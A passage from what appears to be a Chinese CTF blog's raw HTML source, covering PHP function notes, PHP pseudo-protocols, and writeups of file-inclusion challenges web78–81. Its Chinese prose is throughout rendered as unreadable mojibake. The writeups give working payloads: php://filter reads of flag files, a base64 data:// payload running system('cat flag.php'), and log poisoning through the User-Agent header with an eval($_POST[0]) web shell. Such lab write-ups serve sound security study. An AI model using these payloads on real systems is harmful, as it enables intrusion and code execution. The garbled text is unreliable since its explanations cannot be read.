title="hexdec()å‡½æ•°:"></a>hexdec()å‡½æ•°:</h2><h4 id="ç”¨æ³•ï¼š"><a href="#ç”¨æ³•ï¼š" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h4><p>Hexdec()å‡½æ•°æŠŠåå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚</p><h4 id="è¯­æ³•ï¼š-1"><a href="#è¯­æ³•ï¼š-1" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h4><p>Hexdec(hex_string)</p><p>Hex_string:å¿…é¡»ï¼Œè§„å®šè¦è½¬æ¢çš„åå…­è¿›åˆ¶æ•°</p><h2 id="preg-match-å‡½æ•°"><a href="#preg-match-å‡½æ•°" class="headerlink" title="preg_match()å‡½æ•°:"></a>preg_match()å‡½æ•°:</h2><p>Preg_matchå‡½æ•°æ˜¯è¿›è¡Œ<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168186276216800222868537%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168186276216800222868537&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev84%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">æ­£åˆ™è¡¨è¾¾å¼</a>çš„åŒ¹é…ï¼ŒæˆåŠŸè¿”å›1ï¼Œå¦åˆ™è¿”å›0ã€‚</p><h4 id="è¯­æ³•ï¼š-2"><a href="#è¯­æ³•ï¼š-2" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h4><p>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )</p><blockquote><ul><li>$pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå­—ç¬¦ä¸²å½¢å¼ã€‚</li><li>$subject: è¾“å…¥å­—ç¬¦ä¸²ã€‚</li><li>$matches: å¦‚æœæä¾›äº†å‚æ•°matchesï¼Œå®ƒå°†è¢«å¡«å……ä¸ºæœç´¢ç»“æœã€‚ $matches[0]å°†åŒ…å«å®Œæ•´æ¨¡å¼åŒ¹é…åˆ°çš„æ–‡æœ¬ï¼Œ $matches[1] å°†åŒ…å«ç¬¬ä¸€ä¸ªæ•è·å­ç»„åŒ¹é…åˆ°çš„æ–‡æœ¬ï¼Œä»¥æ­¤ç±»æ¨ã€‚</li><li>$flagsï¼šflags å¯ä»¥è¢«è®¾ç½®ä¸ºä»¥ä¸‹æ ‡è®°å€¼ï¼š<br> 1.PREG_OFFSET_CAPTURE: å¦‚æœä¼ é€’äº†è¿™ä¸ªæ ‡è®°ï¼Œå¯¹äºæ¯ä¸€ä¸ªå‡ºç°çš„åŒ¹é…è¿”å›æ—¶ä¼šé™„åŠ å­—ç¬¦ä¸²åç§»é‡(ç›¸å¯¹äºç›®æ ‡å­—ç¬¦ä¸²çš„)ã€‚ æ³¨æ„ï¼šè¿™ä¼šæ”¹å˜å¡«å……åˆ°matcheså‚æ•°çš„æ•°ç»„ï¼Œä½¿å…¶æ¯ä¸ªå…ƒç´ æˆä¸ºä¸€ä¸ªç”± ç¬¬0ä¸ªå…ƒç´ æ˜¯åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²ï¼Œç¬¬1ä¸ªå…ƒç´ æ˜¯è¯¥åŒ¹é…å­—ç¬¦ä¸² åœ¨ç›®æ ‡å­—ç¬¦ä¸²subjectä¸­çš„åç§»é‡ã€‚</li><li>offset: é€šå¸¸ï¼Œæœç´¢ä»ç›®æ ‡å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®å¼€å§‹ã€‚å¯é€‰å‚æ•° offset ç”¨äº æŒ‡å®šä»ç›®æ ‡å­—ç¬¦ä¸²çš„æŸä¸ªæœªçŸ¥å¼€å§‹æœç´¢(å•ä½æ˜¯å­—èŠ‚)ã€‚</li></ul></blockquote><h4 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>è¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯ 0 æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ– 1 æ¬¡ï¼Œå› ä¸º preg_match() åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ã€‚preg_match_all() ä¸åŒäºæ­¤ï¼Œå®ƒä¼šä¸€ç›´æœç´¢subject ç›´åˆ°åˆ°è¾¾ç»“å°¾ã€‚ å¦‚æœå‘ç”Ÿé”™è¯¯preg_match()è¿”å› FALSEã€‚</p><h2 id="str-replace-å‡½æ•°"><a href="#str-replace-å‡½æ•°" class="headerlink" title="str_replace()å‡½æ•°"></a>str_replace()å‡½æ•°</h2><h4 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h4><p>str_replace()å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦(åŒºåˆ†å¤§å°å†™)ã€‚<br>è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š</p><blockquote><ul><li>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚</li><li>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚</li><li>å¦‚æœåŒæ—¶éœ€è¦å¯¹æŸä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œæ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™çš„å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚</li><li>å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†åªå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨ã€‚</li></ul></blockquote><h4 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><strong>str_replace(find,replace,string,count)</strong></p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>find</td><td>å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚</td></tr><tr><td>replace</td><td>å¿…éœ€ã€‚è§„å®šæ›¿æ¢findä¸­å€¼çš„å€¼ã€‚</td></tr><tr><td>string</td><td>å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>count</td><td>å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚</td></tr></tbody></table><p>è¿”å›å€¼ï¼šè¿”å›å¸¦æœ‰æ›¿æ¢å€¼çš„å­—ç¬¦ä¸²æˆ–æ•°ç»„ã€‚</p><h2 id="strpoos-å‡½æ•°"><a href="#strpoos-å‡½æ•°" class="headerlink" title="strpoos()å‡½æ•°"></a>strpoos()å‡½æ•°</h2><h4 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><p>æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®<br>ps:strpos()å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿ&amp;è¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„</p><h4 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><strong>strpos(string,find,start)</strong></p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>string</td><td>å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>find</td><td>å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>start</td><td>å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚</td></tr></tbody></table><h2 id="array-push-å‡½æ•°"><a href="#array-push-å‡½æ•°" class="headerlink" title="array_push()å‡½æ•°"></a>array_push()å‡½æ•°</h2><h4 id="ä½œç”¨-1"><a href="#ä½œç”¨-1" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><p>array_push()å‡½æ•°å‘æ•°ç»„å°¾éƒ¨æ’å…¥ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ </p><h4 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p>array_push(array,valuel,value2â€¦)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>array</td><td>å¿…éœ€ã€‚è§„å®šä¸€ä¸ªæ•°ç»„ã€‚</td></tr><tr><td>value1</td><td>å¿…éœ€ã€‚è§„å®šè¦æ·»åŠ çš„å€¼ã€‚</td></tr><tr><td>value2</td><td>å¯é€‰ã€‚è§„å®šè¦æ·»åŠ çš„å€¼ã€‚</td></tr></tbody></table><p>è¿”å›å€¼ï¼šè¿”å›æ–°æ•°ç»„çš„å…ƒç´ ä¸ªæ•°ã€‚</p><h2 id="in-array-å‡½æ•°"><a href="#in-array-å‡½æ•°" class="headerlink" title="in_array()å‡½æ•°"></a>in_array()å‡½æ•°</h2><h4 id="ä½œç”¨-2"><a href="#ä½œç”¨-2" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><p>in_array()å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼</p><h4 id="è¯­æ³•-3"><a href="#è¯­æ³•-3" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p>bool in_array(mixed $needle,array $haystack[,bool $strict &#x3D; FALSE ])</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>needle</td><td>å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td></tr><tr><td>haystack</td><td>å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td></tr><tr><td>strict</td><td>å¯é€‰ã€‚å¦‚æœè¯¥å‚æ•°è®¾ç½®TRUE,åˆ™in_array()å‡½æ•°æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</td></tr></tbody></table><p>è¿”å›å€¼ï¼šå¦‚æœåœ¨æ•°ç»„ä¸­æ‰¾åˆ°å€¼åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›false</p><h2 id="file-put-contents-å‡½æ•°"><a href="#file-put-contents-å‡½æ•°" class="headerlink" title="file_put_contents()å‡½æ•°"></a>file_put_contents()å‡½æ•°</h2><h4 id="ä½œç”¨-3"><a href="#ä½œç”¨-3" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><p>file_put_contents()å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚<br>è¯¥å‡½æ•°è®¿é—®æ–‡ä»¶æ—¶ï¼Œéµå¾ªä»¥ä¸‹è§„åˆ™ï¼š<br>1.å¦‚æœè®¾ç½®äº† FILE_USE_INCLUDE_PATHï¼Œé‚£ä¹ˆå°†æ£€æŸ¥ <em>filename</em> å‰¯æœ¬çš„å†…ç½®è·¯å¾„<br>2.å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°†åˆ›å»ºä¸€ä¸ªæ–‡ä»¶<br>3.æ‰“å¼€æ–‡ä»¶<br>4.å¦‚æœè®¾ç½®äº† LOCK_EXï¼Œé‚£ä¹ˆå°†é”å®šæ–‡ä»¶<br>5.å¦‚æœè®¾ç½®äº† FILE_APPENDï¼Œé‚£ä¹ˆå°†ç§»è‡³æ–‡ä»¶æœ«å°¾ã€‚å¦åˆ™ï¼Œå°†ä¼šæ¸…é™¤æ–‡ä»¶çš„å†…å®¹<br>6.å‘æ–‡ä»¶ä¸­å†™å…¥æ•°æ®<br>7.å…³é—­æ–‡ä»¶å¹¶å¯¹æ‰€æœ‰æ–‡ä»¶è§£é”<br>8.å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°å°†è¿”å›å†™å…¥æ–‡ä»¶ä¸­çš„å­—ç¬¦æ•°ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› Falseã€‚</p><h4 id="è¯­æ³•-4"><a href="#è¯­æ³•-4" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p>int file_put_contents ( string $filename , mixed $data [, int $flags &#x3D; 0 [, resource $context ]] )</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>filename</td><td>å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶</td></tr><tr><td>data</td><td>å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµã€‚</td></tr><tr><td>flags</td><td>å¯é€‰ã€‚è§„å®šå¦‚ä½•æ‰“å¼€&#x2F;å†™å…¥æ–‡ä»¶ã€‚å¯èƒ½çš„å€¼ï¼š1.FILE_USE_INCLUDE_PATHã€‚</td></tr><tr><td>context</td><td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚contextæ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹</td></tr></tbody></table><p>ä½¿ç”¨ FILE_APPEND é¿å…åˆ é™¤æ–‡ä»¶ä¸­å·²å­˜åœ¨çš„å†…å®¹ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phpä¼ªåè®®ğŸ¥°</title>
    <link href="/2023/04/27/phpweixieyi/"/>
    <url>/2023/04/27/phpweixieyi/</url>
    
    <content type="html"><![CDATA[<p>phpä¼ªåè®®æ˜¯ctfä¸­çš„ä¸€ä¸ªè€ƒç‚¹ï¼Œç›®å‰æ¯”è¾ƒç†Ÿæ‚‰çš„ä¼ªåè®®æœ‰php:&#x2F;&#x2F;filter,php:&#x2F;&#x2F;input,data:&#x2F;&#x2F;text&#x2F;plain,file:&#x2F;&#x2F;ã€‚<br>è¦æˆåŠŸåº”ç”¨ä¼ªåè®®éœ€è¦php.iniæ–‡ä»¶çš„<strong>allow_url_fopen é»˜è®¤å¼€å¯</strong>       <strong>allow_url_include é»˜è®¤å…³é—­</strong></p><h2 id="file-x2F-x2F-ä¼ªåè®®"><a href="#file-x2F-x2F-ä¼ªåè®®" class="headerlink" title="file:&#x2F;&#x2F;ä¼ªåè®®"></a>file:&#x2F;&#x2F;ä¼ªåè®®</h2><p>æ­¤åè®®å¯ä»¥åœ¨åŒoffçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶<br>ä½¿ç”¨æ–¹æ³•ï¼š<br>file:&#x2F;&#x2F;æ–‡ä»¶ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å å¦‚<a href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a></p><h2 id="data-x2F-x2F-text-x2F-plainåè®®"><a href="#data-x2F-x2F-text-x2F-plainåè®®" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plainåè®®"></a>data:&#x2F;&#x2F;text&#x2F;plainåè®®</h2><p>æ­¤åè®®éœ€è¦åœ¨åŒonçš„æƒ…å†µä¸‹æ‰èƒ½ä½¿ç”¨ï¼Œå¾ˆå¸¸ç”¨çš„æ•°æ®æµæ„é€ å™¨ï¼Œå°†è¯»å–åé¢baseç¼–ç å­—ç¬¦ä¸²åè§£ç çš„æ•°æ®ä½œä¸ºæ•°æ®æµçš„è¾“å…¥<br>ä½¿ç”¨æ–¹æ³•ï¼š<br>data:&#x2F;&#x2F;text&#x2F;plain;base64,base64ç¼–ç å­—ç¬¦  å¦‚<a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p><p>ã€€ã€€ã€€ã€€ã€€data:&#x2F;&#x2F;text&#x2F;plain,å­—ç¬¦   å¦‚<a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><h2 id="php-inputåè®®"><a href="#php-inputåè®®" class="headerlink" title="php:inputåè®®"></a>php:inputåè®®</h2><p>æ­¤åè®®éœ€è¦allow_url_includeä¸ºonï¼Œå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®ä½œä¸ºphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚<br>ä½¿ç”¨æ–¹æ³•ï¼šphp:&#x2F;&#x2F;input,ç„¶åpostéœ€è¦æ‰§è¡Œçš„æ•°æ® å¦‚<a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a>    ç„¶ååœ¨postä¸­<?php phpinfo() ?><br><img src="/images/hhh.png"></p><h2 id="php-x2F-x2F-filteråè®®"><a href="#php-x2F-x2F-filteråè®®" class="headerlink" title="php:&#x2F;&#x2F;filteråè®®"></a>php:&#x2F;&#x2F;filteråè®®</h2><p>åœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä½¿ç”¨ï¼Œè¯»å–æ–‡ä»¶å¹¶è¿›è¡Œæ˜¾ç¤ºæˆ–å†™å…¥</p><table><thead><tr><th>åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ï¼Œå®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td></tr><tr><td>read&#x3D;&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦(</td></tr><tr><td>write&#x3D;&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>write&#x3D;&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td></tr><tr><td>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ read&#x3D; æˆ– write&#x3D; ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td></tr></tbody></table><p>ä½¿ç”¨æ–¹æ³•ï¼š<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;æ–‡ä»¶å(å¯¹æ–‡ä»¶è¿›è¡Œbase64ç¼–ç å¹¶è¯»å–æ˜¾ç¤º)  å¦‚ï¼š<br><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php</a> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>webå…¥é—¨ï¼šæ–‡ä»¶åŒ…å«ğŸ¥°</title>
    <link href="/2023/04/27/wenjianbaohan/"/>
    <url>/2023/04/27/wenjianbaohan/</url>
    
    <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>includeåŒ…å«ï¼Œå°è¯•ä½¿ç”¨ä¼ªåè®®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨base64è§£ç è·å¾—flag</p><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>str_replace()å‡½æ•°æŠŠphpæ›¿æ¢æˆäº†???<br>ä½¿ç”¨dataåè®®ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=data:<span class="hljs-regexp">//</span>text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=<br></code></pre></td></tr></table></figure><p>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;  â€”&gt;   <strong>&lt;?php system(â€˜cat flag.phpâ€™);</strong></p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜phpå’Œdataåè®®éƒ½ç”¨ä¸äº†äº†ï¼Œå°è¯•ä»¥ä¸‹åŒ…å«æ—¥å¿—æ–‡ä»¶<br>é€šè¿‡fn+f12æŸ¥çœ‹ç½‘ç»œ<br><img src="/images/13.png"><br>æˆ–<br>burpsuiteæŠ“åŒ…<br>æˆ–<br>Wappalyzer<br>éƒ½å¯çœ‹åˆ°<br>æœ¬é¢˜æ˜¯nginxæœåŠ¡å™¨</p><p>nginxæœåŠ¡å™¨çš„æ—¥å¿—é€šå¸¸è·¯å¾„ä¸ºï¼š<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>æˆ–<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>æœ¬é¢˜çš„è·¯å¾„æ˜¯&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>åœ¨urlä¸­è¾“å…¥?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log è¯»å–æ—¥å¿—<br>å‘ç°å†…å®¹ä¸ºè¯·æ±‚è¡Œã€UAå¤´ã€IPåœ°å€</p><p>ä½¿ç”¨burp suiteæŠ“åŒ…<br>åœ¨UAå¤´å†™å…¥shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ä¸­å›½èšå‰‘æ‹¿åˆ°flag</p><p>æ–¹æ³•äºŒï¼š</p><p>burp suiteæŠ“åŒ…<br>åœ¨UAå¤´ä¸­æ’å…¥payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl??.php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è·å¾—flag</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>ä¸80é¢˜æ–¹æ³•ä¸€æ ·ğŸ˜Š</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>webå…¥é—¨:å‘½ä»¤æ‰§è¡ŒğŸ« </title>
    <link href="/2023/04/24/minlinzhixin/"/>
    <url>/2023/04/24/minlinzhixin/</url>
    
    <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span 